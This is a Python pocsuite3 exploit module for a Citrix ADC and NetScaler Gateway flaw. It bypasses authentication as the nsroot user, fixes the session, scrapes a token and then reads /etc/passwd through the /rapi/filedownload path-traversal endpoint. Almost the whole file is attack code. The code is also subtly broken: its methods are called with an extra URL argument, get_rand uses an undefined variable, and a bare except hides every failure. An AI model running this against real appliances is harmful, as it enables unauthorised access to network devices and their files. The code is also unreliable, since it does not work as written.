import sys
import string
import json
from urllib.parse import quote
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger, VUL_TYPE
from pocsuite3.lib.utils import random_str
requests.packages.urllib3.disable_warnings()


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    references = ['']
    name = 'Citrix LFI'
    appPowerLink = ''
    appName = 'Citrix'
    appVersion = '''
    Citrix ADC、Citrix Gateway < 13.0、58.30
    Citrix ADC、NetScaler Gateway < 12.1、57.18
    Citrix ADC、NetScaler Gateway < 12.0、63.21
    Citrix ADC、NetScaler Gateway < 11.1、64.14
    NetScaler ADC、NetScaler Gateway < 10.5、70.18
    Citrix SD-WAN WANOP < 11.1.1a
    Citrix SD-WAN WANOP < 11.0.3d
    Citrix SD-WAN WANOP < 10.2.7
    '''
    desc = ''''''
    samples = []
    install_requires = ['']
    vulType = VUL_TYPE.COMMAND_EXECUTION
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def create_session(self,session):
        target = self.url + '/pcidss/report'

        params = {
            'type': 'allprofiles',
            'sid': 'loginchallengeresponse1requestbody',
            'username': 'nsroot',
            'set': '1'
        }

        headers = {
            'Content-Type': 'application/xml',
            'X-NITRO-USER': random_str(length=8),
            'X-NITRO-PASS': random_str(length=8),
        }

        data = '<appfwprofile><login></login></appfwprofile>'

        session.post(url=target, params=params, headers=headers,
                     data=data, verify=False)
        return session

    def fix_session(self, session):
        target = self.url + '/menu/ss'

        params = {
            'sid': 'nsroot',
            'username': 'nsroot',
            'force_setup': '1'
        }

        session.get(url=target, params=params, verify=False)

    def get_rand(self,session):
        url = self.url + '/menu/stc'
        r = session.get(url=target, verify=False)

        for line in r.text.split('\n'):
            if 'var rand =' in line:
                rand = line.split('"')[1]
                return rand

    def do_lfi(self, session, rand):
        payload = '%2fetc%2fpasswd'
        target = self.url + '/rapi/filedownload?filter=path:' + payload
        headers = {
            'Content-Type': 'application/xml',
            'X-NITRO-USER': random_str(length=8),
            'X-NITRO-PASS': random_str(length=8),
            'rand_key': rand
        }

        data = '<clipermission></clipermission>'

        r = session.post(url=target, headers=headers, data=data, verify=False)
        return r.text

    def _verify(self):
        result = {}

        try:
            logger.info('[-] Creating session..')
            session = requests.Session()
            self.create_session(self.url, session)
            logger.info(session.cookies.get_dict())
            logger.info(
                '[+] Got session: {0}'.format(session.cookies.get_dict()['SESSID']))

            logger.info('[-] Fixing session..')
            self.fix_session(self.url, session)

            logger.info('[-] Getting rand..')
            rand = self.get_rand(self.url, session)
            logger.info('[+] Got rand: {0}'.format(rand))

            logger.info('[-] Re-breaking session..')
            self.create_session(self.url, session)

            logger.info('[-] Getting file..')
            file_text = self.do_lfi(self.url, session, rand)

            if 'root' in file_text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except:
            pass
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
